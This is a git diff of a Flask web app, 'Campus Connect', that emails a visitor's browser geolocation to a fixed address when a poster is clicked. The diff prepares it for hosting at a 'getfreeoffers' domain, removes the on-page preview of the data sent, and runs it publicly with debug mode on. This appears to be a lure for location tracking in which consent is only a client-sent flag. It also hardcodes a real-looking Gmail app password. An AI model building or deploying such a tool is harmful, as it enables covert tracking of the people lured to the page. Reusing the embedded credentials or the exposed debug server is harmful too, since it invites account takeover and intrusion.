@@ -1,10 +1,10 @@
 # app.py — Share location via Email (Consent + Geolocation)
 # ---------------------------------------------------------
 # 1) pip install Flask
-# 2) Edit CONFIG (SMTP settings, sender, recipient)
+# 2) Edit CONFIG (SMTP + ALLOWED_ORIGINS)
 # 3) python app.py → http://127.0.0.1:5000
 
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, make_response
 from urllib.parse import quote
 import smtplib, ssl
 from email.message import EmailMessage
@@ -15,17 +15,44 @@ app.secret_key = "education-location-secret"
 
 # ================= CONFIG =================
 # SMTP Server (choose one set)
-SMTP_HOST = "smtp.gmail.com"   # e.g., Gmail: smtp.gmail.com, Outlook: smtp.office365.com
-SMTP_PORT = 587                # 587 for STARTTLS, 465 for SSL
+SMTP_HOST = "smtp.gmail.com"     # e.g., Gmail: smtp.gmail.com, Outlook: smtp.office365.com
+SMTP_PORT = 587                  # 587 for STARTTLS, 465 for SSL
 SMTP_USERNAME = "cloudkeys1@gmail.com"
-SMTP_PASSWORD = "xwtkukcruopujueo"  # For Gmail use an App Password (with 2FA)
-USE_SSL = False                # True → SMTP over SSL (port 465); False → STARTTLS (port 587)
+SMTP_PASSWORD = "xwtkukcruopujueo"  # Gmail App Password (with 2FA)
+USE_SSL = False                  # True → SSL (465); False → STARTTLS (587)
 
-FROM_EMAIL = "arinnovativetechnologies@gmail.com"     # sender
-TO_EMAIL   = "arinnovativetechnologies@zohomail.in"    # recipient (your email)
-ALLOWED_ORIGIN = "http://127.0.0.1:5000"  # optional soft origin check for local dev
+FROM_EMAIL = "arinnovativetechnologies@gmail.com"     # sender (Gmail may require matching/alias)
+TO_EMAIL   = "arinnovativetechnologies@zohomail.in"   # recipient
+
+# ✅ Allow local + your Render domain (ADD YOUR REAL RENDER URL BELOW)
+ALLOWED_ORIGINS = {
+    "http://127.0.0.1:5000",
+    "http://localhost:5000",
+    "https://getfreeoffers.onrender.com/",      # <-- change to your real Render URL
+}
 APP_NAME = "Campus Connect"
 # ==========================================
+
+def is_origin_allowed(origin: str) -> bool:
+    # Allow when no Origin (same-origin, some proxies) or when whitelisted
+    return (not origin) or (origin in ALLOWED_ORIGINS)
+
+@app.after_request
+def add_security_and_cors_headers(resp):
+    # Security headers
+    resp.headers["X-Content-Type-Options"] = "nosniff"
+    resp.headers["X-Frame-Options"] = "DENY"
+    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    resp.headers["Permissions-Policy"] = "geolocation=(self)"
+
+    # CORS (for allowed origins only)
+    origin = request.headers.get("Origin", "")
+    if is_origin_allowed(origin):
+        resp.headers["Access-Control-Allow-Origin"] = origin or "*"
+        resp.headers["Vary"] = "Origin"
+        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
+        resp.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
+    return resp
 
 INDEX_HTML = """
 <!doctype html>
@@ -38,46 +65,21 @@ INDEX_HTML = """
     :root{--bg:#f4f7fb;--card:#fff;--ink:#14233b;--muted:#6c7a91;--accent:#2b6cb0;--ok:#1d8649;--err:#b42318;--radius:18px}
     *{box-sizing:border-box}
     body{
-      margin:0;
-      font-family:Inter,system-ui,Arial,sans-serif;
+      margin:0;font-family:Inter,system-ui,Arial,sans-serif;
       background:linear-gradient(180deg,#eef5ff 0%,var(--bg) 100%);
-      color:var(--ink);
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px;
+      color:var(--ink);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;
     }
     .container{max-width:950px;width:100%;padding:0 12px}
-    .card{
-      background:var(--card);
-      border-radius:var(--radius);
-      box-shadow:0 14px 40px rgba(20,30,80,.08);
-      overflow:hidden;
-    }
+    .card{background:var(--card);border-radius:var(--radius);box-shadow:0 14px 40px rgba(20,30,80,.08);overflow:hidden}
     .header{padding:18px 18px 8px}
     .muted{color:var(--muted)}
-    .poster{
-      position:relative;margin:0;cursor:pointer;outline:none
-    }
-    .poster img{
-      display:block;width:100%;height:auto;transition:transform .35s ease
-    }
+    .poster{position:relative;margin:0;cursor:pointer;outline:none}
+    .poster img{display:block;width:100%;height:auto;transition:transform .35s ease}
     .poster:hover img,.poster:focus img{transform:scale(1.015)}
-    .tag{
-      position:absolute;left:16px;bottom:16px;
-      background:rgba(255,255,255,.92);
-      border-radius:12px;padding:8px 12px;
-      font-weight:600;color:var(--accent);
-      box-shadow:0 10px 24px rgba(0,0,0,.05)
-    }
+    .tag{position:absolute;left:16px;bottom:16px;background:rgba(255,255,255,.92);border-radius:12px;padding:8px 12px;font-weight:600;color:var(--accent);box-shadow:0 10px 24px rgba(0,0,0,.05)}
     .panel{padding:14px 18px 18px;border-top:1px solid #edf3ff}
-    .status{min-height:24px;font-size:14px}
-    .ok{color:var(--ok)} .err{color:var(--err)}
-    .prepared{
-      margin-top:10px;background:#f6fbff;border:1px solid rgba(43,108,176,.12);
-      border-radius:10px;padding:10px;font-size:13px;white-space:pre-wrap;word-break:break-word;display:none
-    }
+    .status{min-height:24px;font-size:14px}.ok{color:var(--ok)} .err{color:var(--err)}
+    .prepared{display:none}
     .hint{font-size:12px;color:var(--muted)}
   </style>
 </head>
@@ -108,7 +110,6 @@ INDEX_HTML = """
   <script>
     const poster   = document.getElementById("poster");
     const statusEl = document.getElementById("status");
-    const preEl    = document.getElementById("prepared");
     let isSending  = false;
 
     function setStatus(msg, cls){
@@ -137,20 +138,19 @@ INDEX_HTML = """
       setStatus("Requesting geolocation permission…");
       try{
         const pos = await getGeo();
-        const lat = pos.coords.latitude.toFixed(7);
-        const lng = pos.coords.longitude.toFixed(7);
-        const acc = pos.coords.accuracy ? Math.round(pos.coords.accuracy) + " m" : "unknown";
+        const latNum = pos?.coords?.latitude;
+        const lngNum = pos?.coords?.longitude;
+        const accNum = pos?.coords?.accuracy;
+
+        if (typeof latNum !== "number" || typeof lngNum !== "number" || !isFinite(latNum) || !isFinite(lngNum)) {
+          throw new Error("Location unavailable (no coordinates). Try again with GPS enabled.");
+        }
+
+        const lat = +latNum.toFixed(7);
+        const lng = +lngNum.toFixed(7);
+        const acc = (typeof accNum === "number" && isFinite(accNum)) ? (Math.round(accNum) + " m") : "unknown";
         const map = mapLink(lat,lng);
 
-        const body =
-`{{ app_name }} — User Shared Location
-Latitude: ${lat}
-Longitude: ${lng}
-Accuracy: ${acc}
-Map: ${map}`;
-
-        preEl.textContent = body;
-        preEl.style.display = "block";
         setStatus("Sending email…");
 
         const res = await fetch("/send-email", {
@@ -171,7 +171,6 @@ Map: ${map}`;
           setStatus("Error: " + (e.message || e), "err");
         }
       }finally{
-        // small delay to prevent accidental double taps
         setTimeout(()=>{ isSending = false; }, 600);
       }
     }
@@ -186,30 +185,36 @@ Map: ${map}`;
   </script>
 </body>
 </html>
-
 """
 
 @app.route("/")
 def index():
     return render_template_string(INDEX_HTML, to_email=TO_EMAIL, app_name=APP_NAME)
 
+# CORS preflight (some hosts/browsers may send it)
+@app.route("/send-email", methods=["OPTIONS"])
+def preflight():
+    resp = make_response(("", 204))
+    return resp
+
 @app.post("/send-email")
 def send_email():
-    # Optional simple origin check
-    origin = request.headers.get("Origin")
-    if ALLOWED_ORIGIN and origin and origin != ALLOWED_ORIGIN:
+    origin = request.headers.get("Origin", "")
+    if not is_origin_allowed(origin):
         return jsonify({"ok": False, "error": "Origin not allowed"}), 403
 
     data = request.get_json(silent=True) or {}
     if data.get("consent") is not True:
         return jsonify({"ok": False, "error": "Consent is required"}), 400
 
-    lat = data.get("lat")
-    lng = data.get("lng")
-    acc = data.get("acc", "unknown")
-    map_url = data.get("map")
-    if not lat or not lng:
-        return jsonify({"ok": False, "error": "Missing coordinates"}), 400
+    try:
+        lat = float(data.get("lat"))
+        lng = float(data.get("lng"))
+    except (TypeError, ValueError):
+        return jsonify({"ok": False, "error": "Missing or invalid coordinates"}), 400
+
+    acc = data.get("acc") or "unknown"
+    map_url = data.get("map") or f"https://www.google.com/maps/search/?api=1&query={lat},{lng}"
 
     # Compose Email
     subject = f"{APP_NAME} — Location Share (with consent)"
@@ -224,7 +229,7 @@ def send_email():
     )
 
     msg = EmailMessage()
-    msg["From"] = FROM_EMAIL
+    msg["From"] = FROM_EMAIL or SMTP_USERNAME
     msg["To"] = TO_EMAIL
     msg["Subject"] = subject
     msg.set_content(body)
@@ -241,15 +246,12 @@ def send_email():
                 server.starttls(context=ssl.create_default_context())
                 server.login(SMTP_USERNAME, SMTP_PASSWORD)
                 server.send_message(msg)
-
         return jsonify({"ok": True})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
 
-
 @app.get("/health")
 def health():
-    # Minimal mask of sensitive info
     def mask(s, keep=3): 
         return (s[:keep] + "…" + "*"*5) if s else "NOT SET"
     return jsonify({
@@ -257,10 +259,12 @@ def health():
         "smtp_port": SMTP_PORT,
         "use_ssl": USE_SSL,
         "username": mask(SMTP_USERNAME),
-        "from_email": FROM_EMAIL,
-        "to_email": TO_EMAIL
+        "from_email": FROM_EMAIL or SMTP_USERNAME,
+        "to_email": TO_EMAIL,
+        "allowed_origins": list(ALLOWED_ORIGINS),
     })
 
 if __name__ == "__main__":
     print("🚀 Server on http://127.0.0.1:5000 — Email mode")
-    app.run(host="127.0.0.1", port=5000, debug=True)
+    print("Allowed origins:", ALLOWED_ORIGINS)
+    app.run(host="0.0.0.0", port=5000, debug=True)
